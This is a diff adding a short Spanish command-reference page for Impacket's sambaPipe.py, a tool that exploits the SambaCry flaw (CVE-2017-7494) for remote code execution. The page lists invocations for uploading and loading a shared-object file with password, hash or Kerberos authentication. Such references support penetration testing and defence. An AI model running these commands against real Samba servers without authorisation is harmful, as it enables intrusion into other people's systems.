@@ -1,0 +1,13 @@
+# sambapipe.py
+
+Aprovecha la vulnerabilidad CVE-2017-7494 (SambaCry) para subir y cargar un archivo de objeto compartido (SO) en un servidor Samba vulnerable con el fin de ejecutar código de forma remota. Forma parte del paquete Impacket.
+
+## Usage
+- `sambaPipe.py -so ruta/al/archivo.so dominio/usuario:contraseña@objetivo` : sube y carga un archivo de objeto compartido en un servidor Samba vulnerable
+- `sambaPipe.py -so ruta/al/archivo.so -hashes LM_HASH:NT_HASH dominio/usuario:contraseña@objetivo` : autentica utilizando hash NTLM en lugar de una contraseña
+- `sambaPipe.py -so ruta/al/archivo.so -k -no-pass dominio/usuario:contraseña@destino` : utiliza la autenticación Kerberos para el destino
+- `sambaPipe.py -so ruta/al/archivo.so -dc-ip dc_ip dominio/usuario:contraseña@objetivo` : especifica la IP de un controlador de dominio para la autenticación
+- `sambaPipe.py -so ruta/al/archivo.so -port puerto dominio/usuario:contraseña@destino` : utiliza un puerto personalizado para la conexión SMB
+
+## Links
+- More information: https://github.com/fortra/impacket
